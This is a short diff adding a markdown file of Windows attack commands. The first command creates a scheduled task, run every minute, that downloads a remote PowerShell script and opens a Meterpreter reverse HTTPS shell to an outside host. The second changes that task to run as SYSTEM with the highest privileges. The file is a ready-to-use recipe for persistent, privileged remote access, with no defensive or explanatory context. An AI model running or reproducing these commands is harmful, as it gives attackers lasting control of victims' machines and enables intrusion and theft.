@@ -1,0 +1,7 @@
+# Create a Scheduled Task
+
+1) schtasks /create /tn syscheck01 /tr "powershell \"IEX (New-Object Net.WebClient).DownloadString('http://bit.ly/2jMeXr2');Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost pwned.ddns.net -Lport 6213 -Force\"" /SC MINUTE /MO 1
+
+# Modify the Scheduled Task to run with Highest Priveleges and as SYSTEM
+
+2) powershell saps powershell -ArgumentList \"schtasks /change /tn syscheck01 /RU SYSTEM /RL HIGHEST\" -Verb RunAs
